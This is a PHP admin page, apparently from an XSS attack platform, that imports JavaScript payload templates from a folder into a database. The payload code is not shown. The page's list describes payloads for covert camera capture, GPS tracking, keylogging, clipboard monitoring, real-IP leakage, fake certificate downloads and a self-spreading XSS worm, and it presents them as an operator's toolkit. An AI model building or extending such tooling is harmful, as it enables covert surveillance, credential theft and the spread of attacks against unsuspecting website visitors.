<?php
/**
 * 导入高级XSS模板 - 从jstemplates文件夹读取
 * 这个脚本会读取jstemplates目录下的所有.js文件并导入到数据库
 */

require_once 'config.php';
session_start();

// 检查登录和管理员权限
if (!isLoggedIn()) {
    header('Location: login.php');
    exit;
}

if (!isAdmin()) {
    http_response_code(403);
    die('<h1>403 Forbidden</h1><p>只有管理员可以导入模板</p><a href="templates.php">返回模板页面</a>');
}

// 处理AJAX导入请求（必须在输出HTML之前）
if (isset($_GET['action']) && $_GET['action'] === 'import') {
    header('Content-Type: application/json; charset=utf-8');
    
    try {
        $pdo = getDbConnection();
        
        // 定义jstemplates目录
        $templatesDir = __DIR__ . '/jstemplates';
        
        if (!is_dir($templatesDir)) {
            throw new Exception("模板目录不存在: {$templatesDir}");
        }
        
        // 扫描所有.js文件
        $files = glob($templatesDir . '/*.js');
        
        if (empty($files)) {
            throw new Exception("未找到任何.js模板文件");
        }
        
        $inserted = 0;
        $updated = 0;
        $skipped = 0;
        $details = [];
        
        foreach ($files as $filePath) {
            $filename = basename($filePath);
            $content = file_get_contents($filePath);
            
            if ($content === false) {
                $details[] = "错误: 无法读取 {$filename}";
                continue;
            }
            
            // 检查是否已存在
            $checkStmt = $pdo->prepare("SELECT id, content FROM templates WHERE filename = ?");
            $checkStmt->execute([$filename]);
            $existing = $checkStmt->fetch(PDO::FETCH_ASSOC);
            
            if ($existing) {
                // 如果内容不同,则更新
                if ($existing['content'] !== $content) {
                    $updateStmt = $pdo->prepare("UPDATE templates SET content = ?, size = ?, updated_at = CURRENT_TIMESTAMP WHERE filename = ?");
                    $updateStmt->execute([$content, strlen($content), $filename]);
                    $updated++;
                    $details[] = "更新: {$filename} (内容已变化)";
                } else {
                    $skipped++;
                    $details[] = "跳过: {$filename} (内容相同)";
                }
                continue;
            }
            
            // 插入新模板
            $stmt = $pdo->prepare("INSERT INTO templates (filename, content, size) VALUES (?, ?, ?)");
            $stmt->execute([$filename, $content, strlen($content)]);
            
            $inserted++;
            $details[] = "导入: {$filename} (" . number_format(strlen($content)) . " 字节)";
        }
        
        echo json_encode([
            'success' => true,
            'message' => "成功导入 {$inserted} 个新模板，更新 {$updated} 个模板，跳过 {$skipped} 个未变化的模板",
            'inserted' => $inserted,
            'updated' => $updated,
            'skipped' => $skipped,
            'total' => count($files),
            'details' => $details
        ], JSON_UNESCAPED_UNICODE);
        
    } catch (PDOException $e) {
        echo json_encode([
            'success' => false,
            'message' => '数据库错误: ' . $e->getMessage()
        ], JSON_UNESCAPED_UNICODE);
    } catch (Exception $e) {
        echo json_encode([
            'success' => false,
            'message' => '导入失败: ' . $e->getMessage()
        ], JSON_UNESCAPED_UNICODE);
    }
    
    exit;
}

// 设置页面编码
header('Content-Type: text/html; charset=utf-8');

?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Favicon -->
    <link rel="icon" type="image/png" href="tu/xssicon.png">
    
    <title>导入高级模板 - <?php echo APP_NAME; ?></title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Microsoft YaHei', Arial, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            min-height: 100vh; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            padding: 20px; 
        }
        .container { 
            background: white; 
            border-radius: 10px; 
            box-shadow: 0 10px 40px rgba(0,0,0,0.3); 
            padding: 40px; 
            max-width: 900px; 
            width: 100%; 
        }
        h1 { 
            color: #333; 
            margin-bottom: 10px; 
            display: flex; 
            align-items: center; 
            gap: 10px; 
        }
        .subtitle { 
            color: #666; 
            margin-bottom: 30px; 
            font-size: 14px; 
            line-height: 1.6;
        }
        .info-box {
            background: #e7f3ff;
            border-left: 4px solid #2196F3;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 4px;
        }
        .info-box h3 {
            color: #1976D2;
            margin-bottom: 10px;
            font-size: 16px;
        }
        .info-box ul {
            margin-left: 20px;
            color: #555;
            font-size: 13px;
            line-height: 1.8;
        }
        .btn { 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            color: white; 
            border: none; 
            padding: 12px 30px; 
            border-radius: 5px; 
            cursor: pointer; 
            font-size: 16px; 
            transition: transform 0.2s; 
        }
        .btn:hover { transform: translateY(-2px); }
        .btn:disabled { background: #ccc; cursor: not-allowed; }
        .btn-secondary {
            background: #6c757d;
            margin-left: 10px;
        }
        .result { 
            margin-top: 20px; 
            padding: 15px; 
            border-radius: 5px; 
            display: none; 
        }
        .success { 
            background: #d4edda; 
            border: 1px solid #c3e6cb; 
            color: #155724; 
        }
        .error { 
            background: #f8d7da; 
            border: 1px solid #f5c6cb; 
            color: #721c24; 
        }
        .stats { 
            display: grid; 
            grid-template-columns: repeat(4, 1fr); 
            gap: 15px; 
            margin-top: 20px; 
        }
        .stat-card { 
            background: #f8f9fa; 
            padding: 15px; 
            border-radius: 5px; 
            text-align: center; 
        }
        .stat-number { 
            font-size: 28px; 
            font-weight: bold; 
            color: #667eea; 
        }
        .stat-label { 
            font-size: 12px; 
            color: #666; 
            margin-top: 5px; 
        }
        .log { 
            background: #f8f9fa; 
            border: 1px solid #dee2e6; 
            border-radius: 5px; 
            padding: 15px; 
            max-height: 400px; 
            overflow-y: auto; 
            font-family: 'Courier New', monospace; 
            font-size: 12px; 
            line-height: 1.6; 
            margin-top: 20px; 
            display: none; 
        }
        .log-item { 
            padding: 5px; 
            border-bottom: 1px solid #e9ecef; 
        }
        .log-item:last-child { border-bottom: none; }
        .log-success { color: #28a745; }
        .log-error { color: #dc3545; }
        .log-info { color: #17a2b8; }
        .log-update { color: #fd7e14; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚀 导入高级XSS模板</h1>
        <p class="subtitle">
            从 <code>/jstemplates</code> 目录读取所有高级XSS Payload模板并导入到数据库<br>
            此操作会自动更新已变化的模板内容
        </p>
        
        <div class="info-box">
            <h3>📦 可导入的高级模板</h3>
            <ul>
                <li><strong>GPS定位</strong> - gps-location.js (获取用户精确地理位置)</li>
                <li><strong>摄像头拍照</strong> - camera-capture.js (调用摄像头并上传照片)</li>
                <li><strong>真实IP检测</strong> - real-ip-detect.js (WebRTC检测真实IP地址)</li>
                <li><strong>超级截屏</strong> - super-screenshot.js (截取整个网页截图)</li>
                <li><strong>钓鱼证书</strong> - phishing-cert-download.js (伪造证书下载)</li>
                <li><strong>XSS蠕虫</strong> - xss-worm-spread.js (自动传播扩散)</li>
                <li><strong>高级指纹</strong> - advanced-fingerprint.js (完整浏览器指纹采集)</li>
                <li><strong>剪贴板劫持</strong> - clipboard-history.js (监控剪贴板历史)</li>
                <li><strong>高级键盘记录</strong> - advanced-keylogger.js (智能键盘记录)</li>
                <li>... 以及更多其他模板</li>
            </ul>
        </div>
        
        <div class="stats" id="stats" style="display:none;">
            <div class="stat-card">
                <div class="stat-number" id="totalCount">0</div>
                <div class="stat-label">扫描文件数</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="insertCount">0</div>
                <div class="stat-label">新增导入</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="updateCount">0</div>
                <div class="stat-label">内容更新</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="skipCount">0</div>
                <div class="stat-label">跳过未变化</div>
            </div>
        </div>
        
        <div id="result" class="result"></div>
        
        <div class="log" id="log"></div>
        
        <div>
            <button class="btn" id="importBtn" onclick="importTemplates()">🚀 开始导入</button>
            <button class="btn btn-secondary" onclick="location.href='templates.php'">返回模板管理</button>
        </div>
    </div>

    <script>
        function addLog(message, type = 'info') {
            const log = document.getElementById('log');
            log.style.display = 'block';
            const item = document.createElement('div');
            item.className = 'log-item log-' + type;
            item.textContent = '• ' + message;
            log.appendChild(item);
            log.scrollTop = log.scrollHeight;
        }

        async function importTemplates() {
            const btn = document.getElementById('importBtn');
            const result = document.getElementById('result');
            const stats = document.getElementById('stats');
            const log = document.getElementById('log');
            
            btn.disabled = true;
            btn.textContent = '⏳ 正在导入...';
            result.style.display = 'none';
            log.innerHTML = '';
            log.style.display = 'none';
            stats.style.display = 'grid';
            
            addLog('开始扫描 jstemplates 目录...', 'info');
            
            try {
                const response = await fetch('import_advanced_templates.php?action=import', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });
                
                const data = await response.json();
                
                if (data.success) {
                    result.className = 'result success';
                    result.textContent = '✅ ' + data.message;
                    result.style.display = 'block';
                    
                    document.getElementById('totalCount').textContent = data.total;
                    document.getElementById('insertCount').textContent = data.inserted;
                    document.getElementById('updateCount').textContent = data.updated;
                    document.getElementById('skipCount').textContent = data.skipped;
                    
                    addLog(`扫描到 ${data.total} 个模板文件`, 'info');
                    addLog(`成功导入 ${data.inserted} 个新模板`, 'success');
                    addLog(`更新 ${data.updated} 个已变化的模板`, 'update');
                    addLog(`跳过 ${data.skipped} 个未变化的模板`, 'info');
                    
                    // 显示详细日志
                    if (data.details && data.details.length > 0) {
                        addLog('--- 详细信息 ---', 'info');
                        data.details.forEach(detail => {
                            let type = 'info';
                            if (detail.includes('导入:')) type = 'success';
                            else if (detail.includes('更新:')) type = 'update';
                            else if (detail.includes('错误:')) type = 'error';
                            addLog(detail, type);
                        });
                    }
                    
                    // 3秒后自动跳转
                    setTimeout(() => {
                        if (confirm('导入成功！是否立即查看模板库？')) {
                            location.href = 'templates.php';
                        }
                    }, 2000);
                    
                } else {
                    result.className = 'result error';
                    result.textContent = '❌ ' + data.message;
                    result.style.display = 'block';
                    addLog('导入失败: ' + data.message, 'error');
                }
            } catch (error) {
                result.className = 'result error';
                result.textContent = '❌ 导入失败: ' + error.message;
                result.style.display = 'block';
                addLog('系统错误: ' + error.message, 'error');
            } finally {
                btn.disabled = false;
                btn.textContent = '🔄 重新导入';
            }
        }
    </script>
</body>
</html>
